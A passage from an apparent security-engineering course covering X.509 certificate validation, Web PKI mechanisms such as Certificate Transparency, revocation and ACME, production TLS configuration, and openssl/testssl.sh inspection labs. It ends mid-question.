### Further reading

- **RFC 8446** — TLS 1.3. Section 2 ("Protocol Overview") is genuinely readable;
  skim the rest.
- **Site:** `tls13.xargs.org` — "The Illustrated TLS 1.3 Connection", every byte
  of a real handshake annotated. Outstanding. (Also `tls12.xargs.org`.)
- **Video:** Cloudflare's "TLS 1.3 explained" and Robert Heaton's "How does TLS
  work" write-up.
- **Book:** *Bulletproof TLS and PKI*, Ristić — the handshake chapter.
- **Tool:** Wireshark with `SSLKEYLOGFILE` — decrypt your own TLS to see inside.

---

## Chapter 29 — Certificates and how validation works

### In one sentence

An X.509 certificate is a signed statement binding a public key to a domain name,
and your client trusts it only after checking a chain of signatures back to a
root it already trusts — plus name, time, and revocation.

### What's in a certificate

```bash
   openssl x509 -in cert.pem -noout -text
```

```
   Version:               v3
   Serial Number:         (unique per issuer -- appears in CT logs, CRLs)
   Signature Algorithm:   ecdsa-with-SHA256   (how the ISSUER signed this)
   Issuer:                CN = Some Issuing CA, O = Some CA Inc
   Validity:
       Not Before:        2026-01-01
       Not After:         2026-04-01           (90 days -- typical now)
   Subject:               CN = shop.securesh.op   (legacy; often just a dummy)
   Subject Public Key:    id-ecPublicKey, prime256v1, <the actual public key>
   X509v3 extensions:
     Subject Alternative Name (SAN):            <-- THIS is what browsers check
         DNS:shop.securesh.op, DNS:www.securesh.op
     Key Usage:                critical, Digital Signature
     Extended Key Usage:       TLS Web Server Authentication
     Basic Constraints:        critical, CA:FALSE
     Authority Key Identifier: <points at the issuer's key>
     CRL Distribution Points:  <where to fetch revocation list>
     Authority Information Access:  OCSP -- <responder URL>
     CT Precertificate SCTs:   <signed proofs of CT log inclusion>
   Signature:               <the issuer's signature over all of the above>
```

**The Common Name (CN) is legacy and ignored by modern browsers.** Hostname
matching uses the **Subject Alternative Name** extension only. A cert with a CN
but no SAN is rejected.

### The chain of trust

```
   ROOT CA               "SSL.com TLS ECC Root CA 2022"
     (self-signed; its public key ships in your OS / browser TRUST STORE)
        | signs
        v
   INTERMEDIATE CA       "Some TLS Issuing ECC CA 3"
     (kept online to do day-to-day issuance; root stays offline in an HSM)
        | signs
        v
   LEAF / END-ENTITY     "shop.securesh.op"
     (what your server presents; valid ~90 days)

   The server sends LEAF + INTERMEDIATE(S). The client already has the ROOT.
   The client verifies each signature up the chain until it reaches a
   trusted root. A missing intermediate is the #1 "works in Chrome, fails
   in curl" bug -- Chrome caches intermediates, curl doesn't.
```

### What the client actually checks

Every one of these must pass:

```
   1. SIGNATURES        each cert is validly signed by the next one up,
                        chaining to a root in the local trust store.
   2. NAME              the hostname you asked for matches a SAN DNS entry
                        (wildcards: *.example.com matches a.example.com but
                        NOT example.com and NOT a.b.example.com).
   3. TIME              now is within Not Before .. Not After, for every
                        cert in the chain.
   4. BASIC CONSTRAINTS every non-leaf has CA:TRUE and an adequate
                        pathlen; the leaf has CA:FALSE (stops a leaf being
                        used to sign other certs -- the old Moxie
                        "null-prefix" / basicConstraints bugs).
   5. KEY USAGE / EKU   the leaf permits "TLS Web Server Authentication".
   6. REVOCATION        the cert hasn't been revoked (CRL / OCSP / stapling
                        -- see Ch 30; enforcement varies, and that's a
                        genuine weakness).
   7. (browsers) CT     the cert has enough Signed Certificate Timestamps
                        proving it was logged (Ch 30).
   8. (optional) PINNING the key/cert matches a pin you pre-configured.
```

If any check fails, the connection is refused. There is no "ignore once" in
protocols — only browsers offer a click-through, and HSTS (Ch 31) removes even
that.

### Certificate types by validation level

```
   DV  Domain Validated      CA checks you control the domain (an ACME
                             challenge, an email, a DNS record). Minutes,
                             free. ~Almost all certs. Says NOTHING about
                             who runs the site.

   OV  Organisation Validated CA also checks the org exists. Shown only if
                             you dig into cert details. Marginal value.

   EV  Extended Validation   Heavy vetting of the legal entity. Used to
                             give a green bar with company name; browsers
                             REMOVED that UI (users ignored it, and it
                             gave false assurance). Largely pointless now.
```

**The lesson from Chapter 27 restated:** the certificate proves domain control,
not trustworthiness. DV is the norm and that's fine.

### How name matching goes wrong (real bugs)

```
   * Accepting the CN when there's no SAN                    (pre-2017 clients)
   * Wildcard too broad: a cert for *.example.com on a
     shared host lets any subdomain's operator MITM the others
   * NUL byte: CN = "www.good.com\0.evil.com" -- old parsers
     stopped at the NUL and saw "www.good.com"              (Moxie, 2009)
   * IP address in URL but only DNS SANs in cert
   * Internationalised domain / homoglyph SANs               (Ch 7)
   * Not checking the chain at all -- the classic
     "curl | verify=False" / "TrustManager that returns void"
     app bug. Whole libraries shipped this. (Ch 31 revisits.)
```

### Practice (35 min)

```bash
cd ~/sec-lab/scratch

# 1. Pull a real chain and inspect every cert in it
openssl s_client -connect wikipedia.org:443 -servername wikipedia.org \
        -showcerts </dev/null 2>/dev/null > chain.pem
awk 'BEGIN{c=0} /BEGIN CERT/{c++} {print > ("c" c ".pem")}' chain.pem
for f in c*.pem; do
  echo "=== $f ==="
  openssl x509 -in "$f" -noout -subject -issuer -dates \
    -ext subjectAltName 2>/dev/null
done

# 2. Verify a chain yourself, explicitly
openssl verify -show_chain -untrusted <(cat c2.pem c3.pem 2>/dev/null) c1.pem \
  2>&1 || true

# 3. Make your own mini-CA and issue a leaf (you'll reuse this in Ch 31/32)
mkdir -p ~/sec-lab/ca && cd ~/sec-lab/ca
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out ca.key
openssl req -x509 -new -key ca.key -sha256 -days 3650 \
        -subj "/CN=SecureShop Dev Root" \
        -addext "basicConstraints=critical,CA:TRUE,pathlen:0" \
        -addext "keyUsage=critical,keyCertSign,cRLSign" -out ca.crt

openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out shop.key
openssl req -new -key shop.key -subj "/CN=shop.securesh.op" \
        -addext "subjectAltName=DNS:shop.securesh.op,DNS:www.securesh.op" \
        -out shop.csr

openssl x509 -req -in shop.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
        -days 90 -sha256 -copy_extensions copy \
        -extfile <(printf "basicConstraints=critical,CA:FALSE\nkeyUsage=critical,digitalSignature\nextendedKeyUsage=serverAuth\nsubjectAltName=DNS:shop.securesh.op,DNS:www.securesh.op") \
        -out shop.crt

openssl verify -CAfile ca.crt shop.crt        # -> shop.crt: OK
openssl x509 -in shop.crt -noout -text | grep -A1 "Alternative"

# 4. Break it on purpose:
#    - issue a leaf whose SAN doesn't match the hostname you test with
#    - set Not After in the past (-days -1) and watch verify fail
#    - drop CA:FALSE and note the leaf could sign other certs
```

### Common confusions

- **"Browsers check the Common Name."** Not since ~2017. SAN only. No SAN = reject.
- **"A self-signed cert is insecure."** The crypto is identical; what's missing is
  a *third party vouching for the name*. Fine for internal use with your own
  trust anchor (your mini-CA), not for the public web.
- **"The server sends the root."** It sends leaf + intermediates. The client
  already has the root; sending it is wasted bytes (and ignored).
- **"Wildcards are convenient and safe."** `*.example.com` on shared
  infrastructure is a lateral-movement risk and matches only one label deep.
- **"Expired cert = site hacked."** Usually someone forgot to renew. Still fail
  closed — but that's why ACME automation (Ch 30) exists.

### Check yourself

1. Which certificate field is used for hostname matching, and what happens if
   it's absent?
2. Put these in order: root, leaf, intermediate — which does the server send,
   which does the client already have?
3. List five checks a client performs on a certificate chain.
4. Does `*.example.com` match `example.com`? Does it match `a.b.example.com`?
5. What does DV validation actually prove? What does EV add, and why did browsers
   drop the EV UI?
6. Why is a missing intermediate a "works here, fails there" bug?

### Further reading

- **Site:** `badssl.com` — dozens of deliberately-broken TLS configs (expired,
  wrong-host, self-signed, weak-DH, revoked...) to test clients against.
- **Book:** *Bulletproof TLS and PKI*, Ristić — the X.509 and chain-validation
  chapters.
- **Tool:** `openssl x509`, `openssl verify`, and `certtool` (GnuTLS) — learn the
  flags in Appendix B.
- **RFC 5280** — X.509 and path validation. Dense; use as a reference.
- **Article:** "Everything you should know about certificates and PKI but are too
  afraid to ask" — Mike Malone (smallstep blog). Excellent, thorough.

---

## Chapter 30 — PKI: certificate authorities, transparency, revocation, ACME

### In one sentence

The Web PKI is the global system of ~50 trusted certificate authorities, kept
mostly honest by browser root programs, public Certificate Transparency logs, and
automated issuance — and it's a fragile, fascinating piece of infrastructure.

### The trust store: where "trusted" comes from

```
   Your OS/browser ships a ROOT STORE: a few hundred CA root certificates,
   curated by ROOT PROGRAMS -- Mozilla (the de facto standard), Microsoft,
   Apple, Google, Chrome.

   To get in, a CA must pass annual audits (WebTrust / ETSI), follow the
   CA/Browser Forum "Baseline Requirements", and stay out of trouble.

   To be REMOVED (it happens): mis-issue certs, lie about it, or run sloppy
   infrastructure. DigiNotar (2011, hacked, issued fake *.google.com ->
   dead within weeks). Symantec (2017-18, years of misissuance -> entire
   root distrusted, business sold). TrustCor (2022, opaque ownership ->
   removed).
```

**Any CA in the store can issue a cert for any domain.** That's the PKI's
original sin: your security depends on *all ~50* CAs, not just the one you chose.
The mechanisms below exist to contain that.

### Certificate Transparency (CT)

Since ~2018, browsers reject certificates that aren't logged in public,
append-only **CT logs**.

```
   CA issues a cert  ->  submits it to >= 2 independent CT logs
                     ->  each log returns a Signed Certificate Timestamp (SCT)
                     ->  SCTs are embedded in the cert (or stapled)
   Browser  ->  refuses the cert unless it carries enough valid SCTs

   RESULT: every publicly-trusted certificate is publicly visible.
   Domain owners (and researchers) MONITOR the logs and get alerted to
   unexpected certs for their domains -- turning silent mis-issuance into
   a loud, detectable event, usually within minutes.
```

```bash
   # See every cert ever logged for a domain:
   curl -s 'https://crt.sh/?q=%25.wikipedia.org&output=json' | head -c 2000
   # Set up monitoring: crt.sh RSS, or Cloudflare/Meta/Cert Spotter alerts,
   # or run your own with certstream.
```

CT doesn't *prevent* mis-issuance; it makes it *undeniable and fast to catch*.
That's been enough to keep CAs disciplined.

### Revocation: the part that doesn't really work

If a private key leaks or a cert was mis-issued, you want to revoke it. Three
mechanisms, all flawed:

```
   CRL (Certificate Revocation List)
     A signed list of revoked serials, published by the CA. Can be huge
     (megabytes). Clients rarely fetch them in real time.

   OCSP (Online Certificate Status Protocol)
     Client asks the CA "is serial 12345 still good?" per connection.
     Problems: latency, a privacy leak (the CA learns which sites you
     visit), and -- fatally -- most clients "soft-fail": if the OCSP
     responder is unreachable, they proceed anyway. An attacker who can
     MITM can just block OCSP. So OCSP provides little real security.
     (Let's Encrypt ENDED OCSP service in 2025.)

   OCSP STAPLING
     The SERVER fetches its own OCSP response periodically and "staples"
     it into the handshake. Fixes latency and privacy. But it's optional
     unless the cert has the "must-staple" flag (rarely used).

   WHAT ACTUALLY WORKS TODAY:
     * SHORT-LIVED CERTS. 90-day (moving to 47-day by 2029, per CA/B Forum)
       and even ~7-day certs mean a leaked key is only useful briefly.
       Expiry IS the revocation strategy.
     * Browser-pushed lists: Chrome CRLSets, Mozilla CRLite -- the CA
       ecosystem's revocations, compressed and shipped with the browser.
```

**Takeaway:** don't rely on revocation catching a compromise. Rely on short
lifetimes, automation, and detection.

### ACME and Let's Encrypt

**ACME** (RFC 8555) is the protocol that automated certificate issuance and
killed the "expired cert" outage as a common event.

```
   1. Your ACME client (certbot, acme.sh, lego, Caddy, cert-manager,
      Traefik) generates a key and a CSR.
   2. It asks the CA (Let's Encrypt, ZeroSSL, Google Trust Services...)
      for a cert for example.com.
   3. The CA issues a CHALLENGE proving you control the domain:
        HTTP-01: serve a token at http://example.com/.well-known/acme-challenge/<t>
        DNS-01:  publish a TXT record _acme-challenge.example.com = <hash>
                 (this one can do WILDCARDS)
        TLS-ALPN-01: present a special cert on a TLS connection
   4. Client completes the challenge; CA verifies from multiple network
      vantage points (multi-perspective validation, to resist BGP hijacks).
   5. CA issues a 90-day cert. Client auto-renews at ~60 days. Forever.
```

```bash
   # The modern easy path -- Caddy does ACME automatically:
   #   caddy reverse-proxy --from shop.example --to localhost:8080
   # or certbot:
   #   sudo certbot --nginx -d shop.example -d www.shop.example
```

Let's Encrypt issues for **hundreds of millions** of domains. It made HTTPS free
and automatic — which is why the web went from ~40% to ~95%+ HTTPS in a decade
(and why phishing sites have padlocks too).

### CAA records: telling CAs "only these may issue for me"

```
   DNS:  example.com.  CAA  0 issue "letsencrypt.org"
         example.com.  CAA  0 issuewild ";"     (no wildcards for anyone)
         example.com.  CAA  0 iodef "mailto:security@example.com"
```

CAs are *required* to check CAA before issuing. It's a cheap, strong control:
even a compromised or tricked CA that isn't on your list must refuse. **Set it.**

### Practice (35 min)

```bash
cd ~/sec-lab/scratch

# 1. Certificate Transparency: every cert for a domain
curl -s 'https://crt.sh/?q=wikipedia.org&output=json' \
  | python3 -c "import json,sys; [print(r['not_before'][:10], r['issuer_name'][:40], r['name_value'][:60]) for r in json.load(sys.stdin)[:20]]"

# 2. Check a site's CAA records
dig +short CAA wikipedia.org
dig +short CAA github.com

# 3. Inspect OCSP / stapling on a real site
echo | openssl s_client -connect wikipedia.org:443 -servername wikipedia.org \
        -status 2>/dev/null | grep -A 6 "OCSP response"

# 4. Run a real ACME issuance in a container (staging environment -- no rate limits)
docker run --rm -it -p 80:80 certbot/certbot certonly --standalone \
   --staging --non-interactive --agree-tos -m you@example.com \
   -d "$(curl -s ifconfig.me).nip.io" 2>&1 | tail -20
   # (nip.io gives you a real DNS name for any IP -- handy for labs)

# 5. Look at your OS trust store
security find-certificate -a -p /System/Library/Keychains/SystemRootCertificates.keychain 2>/dev/null | grep -c "BEGIN CERT"   # macOS
# ls /etc/ssl/certs/ | head                                                    # Linux
```

### Mini-project (45 min): CT monitor for your domain

```
   Build a script that:
   1. Every run, queries crt.sh (or certstream) for all certs issued for
      YOUR domain (or wikipedia.org for practice) in the last 24h.
   2. Diffs against a stored list of known/expected certs (issuer + SANs).
   3. On anything unexpected: prints a loud alert (and, optionally, sends
      a notification).
   4. Cron it hourly.

   This is exactly what real security teams run. An unexpected cert for
   your domain = someone is preparing to impersonate you, or an internal
   team went around process. Either way you want to know in minutes.
```

### Common confusions

- **"I chose a good CA, so I'm safe."** Any trusted CA can issue for your domain.
  CAA + CT monitoring is how you constrain and watch that.
- **"Revocation protects me if my key leaks."** Mostly not — soft-fail OCSP and
  un-fetched CRLs. Short lifetimes + automation are the real answer.
- **"Let's Encrypt is less secure — it's free and instant."** It does DV, exactly
  like paid DV certs, and its automation makes it *more* reliable. The cert's
  cryptographic value is identical.
- **"Self-run internal CA needs CT."** No — CT is a Web PKI (public trust)
  requirement. Your private CA for internal services doesn't need it (but an
  internal transparency log is still a nice-to-have).
- **"EV certificates stop phishing."** Browsers removed the EV UI because it
  didn't. DV + user education + phishing-resistant auth (Part 8/10) do more.

### Check yourself

1. What does it mean that "any trusted CA can issue for any domain", and which
   two mechanisms mitigate it?
2. What does Certificate Transparency prevent? What does it *not* prevent?
3. Why does OCSP provide little real-world security? What replaced it in
   practice?
4. Walk through an ACME HTTP-01 issuance.
5. What does a CAA record do, and who is obligated to honour it?
6. Name two CAs that were removed from root stores and why.

### Further reading

- **Site:** `crt.sh` and `certificate.transparency.dev` — browse CT logs; read
  the CT explainer.
- **Site:** `letsencrypt.org/how-it-works` and RFC 8555 (ACME).
- **Book:** *Bulletproof TLS and PKI*, Ristić — the PKI, CT, and revocation
  chapters are the best treatment anywhere.
- **Article:** "How Certificate Transparency Works" (certificate.transparency.dev)
  and Emily Stark's talks on the CT ecosystem.
- **Post-mortems:** the DigiNotar and Symantec distrust sagas — search Mozilla's
  `dev-security-policy` archives. Sobering and educational.
- **Tool:** `certbot`, `acme.sh`, `lego`, Caddy, and `cert-manager` (Kubernetes)
  docs.

---

## Chapter 31 — TLS in production

### In one sentence

Running TLS well is mostly operational: where you terminate it, how you configure
it, how you renew certs, whether you authenticate clients, and avoiding a
handful of classic misconfigurations.

### Where TLS terminates

```
   PATTERN A -- terminate at the edge (load balancer / CDN / reverse proxy)
     client --TLS--> [ LB / Cloudflare / nginx ] --plaintext or new TLS--> app

     + central cert management, offload crypto from app servers
     + WAF, rate limiting, HTTP routing all see plaintext
     - traffic from LB to app is in the clear unless you re-encrypt
       -> inside a trusted network boundary? maybe OK. Zero-trust? no.
     - the app doesn't see the real client IP / TLS details unless the
       LB forwards them (X-Forwarded-For, PROXY protocol) -- and if it
       forwards them, you must NOT trust those headers from anywhere else

   PATTERN B -- terminate at the app (or a sidecar)
     client --TLS--> app

     + end-to-end encrypted to the process
     - each app instance manages certs, does its own crypto

   PATTERN C -- re-encrypt / TLS everywhere (service mesh, mTLS)
     client --TLS--> [ LB ] --mTLS--> [ sidecar ] --mTLS--> service
     + zero-trust: every hop authenticated and encrypted
     - operational complexity; mesh (Istio, Linkerd) or careful automation
```

Most real systems are A with re-encryption for sensitive backends. Know which one
you have and where plaintext exists.

### mTLS — authenticating the client too

Normal TLS authenticates only the server. **Mutual TLS** also makes the client
present a certificate.

```
   Server config: request (or require) a client cert, verify it against a
   CA you control.

   USE FOR:  service-to-service auth inside your infra, API clients,
             admin access, IoT fleets, bank/partner integrations.
   NOT FOR:  general public web users (cert distribution to humans is
             miserable; use WebAuthn/passkeys instead -- Part 10).

   mTLS gives you strong, phishing-proof client identity. The hard parts
   are ISSUING client certs, ROTATING them, and REVOKING them -- i.e. you
   now run a mini-PKI. SPIFFE/SPIRE, step-ca, or a mesh automate this.
```

### A sane TLS configuration (2026)

```
   Protocols:     TLS 1.3 + TLS 1.2.  Disable 1.1, 1.0, SSLv3.
   TLS 1.2 suites (if you must support it): ECDHE + AES-GCM or
                  CHACHA20-POLY1305 only. No CBC, RC4, 3DES, static RSA,
                  NULL, EXPORT, anon.
   TLS 1.3 suites: the default five are fine; prefer AES-256-GCM /
                  CHACHA20-POLY1305.
   Key exchange:  X25519 (and P-256). Add X25519MLKEM768 if supported (Ch 25).
   Certs:         ECDSA P-256 leaf (smaller, faster) with an RSA fallback
                  chain only if you still serve very old clients.
   OCSP stapling: on.
   Session:       tickets with frequent key rotation, or stateful cache.
                  0-RTT: off, unless you've audited every early-data path.
   HSTS:          Strict-Transport-Security: max-age=31536000;
                  includeSubDomains; preload   (see below)
   Renewal:       automated (ACME). Alert if a cert is < 20 days from expiry.

   Don't hand-write this. Use Mozilla's SSL Config Generator ("intermediate"
   profile) for your server, then verify with testssl.sh / SSL Labs.
```

### HSTS — forcing HTTPS

```
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

   Tells the browser: "for the next year, NEVER talk to this host over
   plain HTTP, and don't let the user click through cert errors."

   * Defeats sslstrip (attacker downgrades your redirect to HTTP).
   * First visit is still unprotected -> the PRELOAD LIST (hstspreload.org)
     ships the rule in the browser itself. Submitting is a commitment:
     removal takes months. Make sure ALL subdomains do HTTPS first.
```

### The classic misconfigurations (all seen in the wild)

```
   [ ] Disabled certificate verification in a client
       curl -k / verify=False / rejectUnauthorized:false /
       a TrustManager that does nothing / NSURLSession delegate that
       always trusts. -> total MITM exposure. GREP YOUR CODEBASE FOR THIS.
   [ ] Mixed content: HTTPS page loads http:// scripts -> downgrade point.
   [ ] Missing intermediate in the served chain (Ch 29).
   [ ] Wildcard cert shared across trust boundaries / teams / tenants.
   [ ] Private key committed to git, or world-readable, or copied to laptops.
   [ ] Same key reused when renewing for years (rotate the key, not just
       the cert).
   [ ] TLS 1.0/1.1 still enabled "for that one old client".
   [ ] Cert covers apex but not www (or vice versa).
   [ ] Internal services on self-signed certs with verification turned off
       "because it's internal" -> run an internal CA instead.
   [ ] Trusting X-Forwarded-For / X-Forwarded-Proto from outside the LB
       -> spoofed client IP, bypassed "HTTPS-only" checks.
   [ ] Expired cert in a background job / cron / mobile pinning config that
       nobody monitors.
   [ ] HSTS preload submitted before a subdomain was HTTPS-ready -> outage.
```

### Certificate pinning — powerful and dangerous

```
   Pin = your app refuses any cert/key except specific known ones,
   ignoring the normal CA trust decision.

   + defeats a mis-issued or rogue-CA cert entirely
   - if you pin and then need to rotate keys/CAs and forgot to ship a
     backup pin, your app BRICKS itself until an update propagates.
     (This has caused multi-day outages at large companies.)

   Rules if you pin (mostly mobile apps talking to your own API):
     * pin to a CA or intermediate SPKI, not the leaf
     * always ship >= 2 pins including an offline backup key
     * set an expiry; have a killswitch
   For the general web, HPKP (the header version) was removed by browsers
   for exactly these footguns. Use CT monitoring + CAA instead.
```

### Practice (40 min)

```bash
cd ~/sec-lab/scratch

# 1. Grade a real site
docker run --rm -ti drwetter/testssl.sh https://wikipedia.org
# or: testssl.sh --fast https://your-service

# 2. Stand up a properly-configured local HTTPS server with your Ch 29 CA
cd ~/sec-lab/ca
openssl s_server -accept 8443 -cert shop.crt -key shop.key \
        -CAfile ca.crt -tls1_3 -www &
curl --cacert ca.crt https://localhost:8443 -sI      # trusts your CA -> works
curl                 https://localhost:8443 -sI      # no CA -> cert error (good)
curl -k              https://localhost:8443 -sI      # -k bypasses -> DANGER demo
kill %1

# 3. Add mutual TLS
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out client.key
openssl req -new -key client.key -subj "/CN=orders-api-client" -out client.csr
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
        -days 30 -out client.crt
openssl s_server -accept 8443 -cert shop.crt -key shop.key \
        -CAfile ca.crt -Verify 1 -tls1_3 -www &
curl --cacert ca.crt https://localhost:8443 -sI                    # 400/handshake fail: no client cert
curl --cacert ca.crt --cert client.crt --key client.key \
     https://localhost:8443 -sI                                    # OK: client authenticated
kill %1

# 4. Find verification-disabled code (run against your own repos)
grep -rniE "verify=false|rejectUnauthorized|InsecureSkipVerify|NSAllowsArbitraryLoads|curl.*-k|--insecure|trustAllCerts|ALLOW_ALL_HOSTNAME" . 2>/dev/null

# 5. Check HSTS and headers on your services
curl -sI https://wikipedia.org | grep -i -E "strict-transport|content-security"
```

### Mini-project (60 min): "TLS posture" report

```
   Write a tool `tls-audit <host:port>` that reports:
     - negotiated protocol + cipher + key-exchange group
     - full chain: each cert's subject, issuer, SANs, validity, days left,
       key type/size, signature algorithm
     - whether the served chain is complete (no missing intermediate)
     - HSTS present? max-age? includeSubDomains? preload-eligible?
     - OCSP stapling present?
     - CAA records for the domain
     - recent CT log entries for the domain (crt.sh)
     - a PASS/WARN/FAIL summary against the "sane config 2026" list above
   Run it against 5 sites you use. Then against your own.
```

### Common confusions

- **"Internal traffic doesn't need TLS."** Flat internal networks are where
  breaches spread. Zero-trust means encrypt + authenticate every hop.
- **"`-k` is fine for testing."** It trains fingers and gets copied to prod. Add
  your test CA to the trust store instead, or use `--cacert`.
- **"Terminating TLS at the LB means it's end to end."** It's encrypted *to the
  LB*. Everything past that is your responsibility.
- **"HSTS is risky, it might lock users out."** With HTTPS working, HSTS is
  strictly good. Only `preload` + `includeSubDomains` is a hard commitment —
  stage it.
- **"Pinning is best practice, always pin."** Pinning without a tested backup pin
  and killswitch is how apps brick themselves. For the web, don't; for your own
  mobile app to your own API, carefully.

### Check yourself

1. Name the three TLS-termination patterns and where plaintext exists in each.
2. When is mTLS the right choice, and what operational burden does it add?
3. What attack does HSTS defeat, and what's the gap it doesn't cover (and the
   fix)?
4. Give five TLS misconfigurations you'd grep a codebase for.
5. Why is certificate pinning both powerful and dangerous? State two rules for
   doing it safely.
6. Why must you not trust `X-Forwarded-For` from arbitrary sources?

### Further reading

- **Tool:** Mozilla SSL Configuration Generator (`ssl-config.mozilla.org`) — the
  starting point for every server config.
- **Tool:** `testssl.sh` and Qualys SSL Labs (`ssllabs.com/ssltest`) — grade and
  diagnose. Aim for A/A+.
- **Book:** *Bulletproof TLS and PKI*, Ristić — Part III (deployment) is
  essentially this chapter, expanded.
- **Project:** SPIFFE/SPIRE (`spiffe.io`), `step-ca` (smallstep) — automated
  internal PKI and mTLS.
- **Guidance:** OWASP "Transport Layer Security Cheat Sheet" and "Certificate and
  Public Key Pinning" pages.
- **Article:** "The Sad State of Certificate Revocation" and Scott Helme's blog
  (HSTS, CAA, security headers, real-world data).

---

## Chapter 32 — Hands-on: inspecting and testing TLS

### Why this chapter exists

A security engineer inspects TLS constantly — debugging a handshake failure,
auditing a vendor, verifying a fix. This is the toolbox, consolidated.

### `openssl s_client` — the swiss army knife

```bash
# Basic connect, show the negotiated params and chain
openssl s_client -connect example.com:443 -servername example.com -brief </dev/null

# Full detail: every handshake message and state transition
openssl s_client -connect example.com:443 -servername example.com \
        -msg -state -debug </dev/null 2>&1 | less

# Just the leaf certificate, decoded
openssl s_client -connect example.com:443 -servername example.com </dev/null \
        2>/dev/null | openssl x509 -noout -text

# The whole chain as presented
openssl s_client -connect example.com:443 -servername example.com \
        -showcerts </dev/null 2>/dev/null

# Force a protocol version (probe support)
openssl s_client -connect example.com:443 -tls1_2 </dev/null
openssl s_client -connect example.com:443 -tls1_1 </dev/null   # should fail now

# Force / probe a key-exchange group (incl. post-quantum, needs OpenSSL 3.5+)
openssl s_client -connect example.com:443 -groups X25519 </dev/null
openssl s_client -connect example.com:443 -groups X25519MLKEM768 </dev/null

# Check OCSP stapling
openssl s_client -connect example.com:443 -status </dev/null 2>/dev/null \
        | grep -A5 "OCSP Response Status"

# SNI matters: without -servername you may get the wrong/default cert
openssl s_client -connect example.com:443 </dev/null 2>/dev/null \
        | openssl x509 -noout -subject

# Test a specific cipher (TLS 1.2)
openssl s_client -connect example.com:443 -cipher 'ECDHE-ECDSA-AES256-GCM-SHA384' </dev/null

# STARTTLS for mail/other protocols
openssl s_client -connect smtp.example.com:587 -starttls smtp </dev/null

# Client certificate (mTLS)
openssl s_client -connect api.example.com:443 -cert client.crt -key client.key </dev/null

# Measure handshake time
openssl s_time -connect example.com:443 -new -time 5
```

### `openssl x509` / `req` / `verify` — certificate work

```bash
# Decode a cert file
openssl x509 -in cert.pem -noout -text
openssl x509 -in cert.pem -noout -subject -issuer -dates -serial -fingerprint -sha256
openssl x509 -in cert.pem -noout -ext subjectAltName

# Decode a CSR
openssl req -in request.csr -noout -text -verify

# Verify a chain
openssl verify -CAfile root.pem -untrusted intermediates.pem leaf.pem
openssl verify -show_chain -CAfile /etc/ssl/cert.pem leaf.pem

# Does this key match this cert? (the moduli / pubkeys must match)
openssl x509 -in cert.pem -noout -pubkey | openssl md5
openssl pkey -in key.pem -pubout       | openssl md5      # same -> they match

# Convert formats
openssl x509 -in cert.pem -outform der -out cert.der
openssl pkcs12 -export -in cert.pem -inkey key.pem -out bundle.p12    # PEM -> PKCS12
openssl pkcs12 -in bundle.p12 -nodes -out all.pem                     # PKCS12 -> PEM

# CRL / OCSP by hand
openssl crl -in list.crl -noout -text
openssl ocsp -issuer intermediate.pem -cert leaf.pem -text \
        -url http://ocsp.the-ca.example
```

### Purpose-built tools

```bash
# testssl.sh -- comprehensive, offline-capable, scriptable
docker run --rm -ti drwetter/testssl.sh https://example.com
testssl.sh --severity HIGH --jsonfile out.json https://example.com

# sslyze -- fast, Python, great for CI gates
pipx run sslyze example.com:443
pipx run sslyze --json_out r.json --mozilla_config=intermediate example.com

# nmap TLS scripts
nmap --script ssl-enum-ciphers,ssl-cert -p 443 example.com

# hey / curl for behaviour
curl -v --tlsv1.3 --tls-max 1.3 https://example.com
curl --cacert myca.pem --cert client.pem --key client.key https://api.example.com

# Wireshark: filter tls.handshake ; with SSLKEYLOGFILE set, decrypt your own
SSLKEYLOGFILE=/tmp/k.log curl -s https://example.com -o /dev/null
```

### Reading a testssl.sh / SSL Labs report

```
   Look for, in rough priority:
     * Protocols: TLS 1.3 yes, 1.2 yes, everything below NO
     * Cipher categories: only AEAD; no CBC/RC4/3DES/EXPORT/NULL/anon
     * Forward secrecy: on all suites
     * Cert: not expiring soon, SANs correct, chain complete, sane key size,
       SHA-256 signature, CT SCTs present
     * Vulnerabilities section: all "not vulnerable" (Heartbleed, ROBOT,
       CCS, Ticketbleed, BEAST, POODLE, Lucky13, Sweet32, DROWN, Logjam,
       FREAK, CRIME, BREACH*)  (*BREACH is app-level -- separate fix)
     * HSTS present, long max-age
     * OCSP stapling present
   Grade target: A or A+. Anything less, read WHY and fix it.
```

### Practice / capstone lab for Part 7 (90 min)

```
   Build "SecureShop's front door" locally and prove it's sound:

   1. Using your Ch 29 mini-CA, issue an ECDSA P-256 leaf for
      shop.securesh.op (SAN: shop.securesh.op, www.securesh.op).
   2. Add shop.securesh.op -> 127.0.0.1 to /etc/hosts. Add ca.crt to a
      trust store (or use --cacert everywhere).
   3. Run a TLS 1.3-only server (nginx, Caddy, or `openssl s_server`)
      serving a "hello" page, with:
        - TLS 1.3 + 1.2 (ECDHE + AEAD only), 1.0/1.1 disabled
        - HSTS header (max-age 1 year, includeSubDomains)
        - OCSP stapling if your setup supports it
        - HTTP :80 -> 301 redirect to HTTPS
   4. Add an /admin location that requires mTLS (client cert from your CA).
   5. Verify with: curl (trusted + -k), openssl s_client -msg,
      testssl.sh, sslyze. Screenshot an A-grade-equivalent result.
   6. Now BREAK each control and confirm the tools catch it:
        - enable TLS 1.0        -> testssl flags it
        - serve without the intermediate -> curl fails, browsers may not
        - use an expired leaf   -> verify fails
        - wrong SAN             -> hostname mismatch
        - remove HSTS           -> sslstrip becomes possible (explain)
        - drop -Verify on /admin-> anyone reaches admin
   7. Write it up in ~/sec-lab/reports/part7-tls.md: what you built, what
      each tool showed, what each break looked like. This is your first
      real security report -- Part 12 builds on it.
```

### Common confusions

- **"`s_client` hangs."** It's waiting for stdin. Add `</dev/null` (or type
  `Q` + Enter).
- **"Wrong cert returned."** You forgot `-servername` (SNI). Virtual hosts need
  it.
- **"testssl says vulnerable to BREACH — patch TLS."** BREACH is HTTP-response
  compression + secrets in the body; it's an app fix (disable compression on
  sensitive responses, add CSRF-token masking), not a TLS setting.
- **"SSL Labs won't scan my internal host."** Use `testssl.sh` or `sslyze` —
  they run locally and offline.
- **"My key doesn't match my cert."** Compare `openssl x509 -pubkey` and
  `openssl pkey -pubout`; mismatched key/cert is a common deploy error.

### Check yourself

1. What flag makes `openssl s_client` return immediately instead of hanging, and
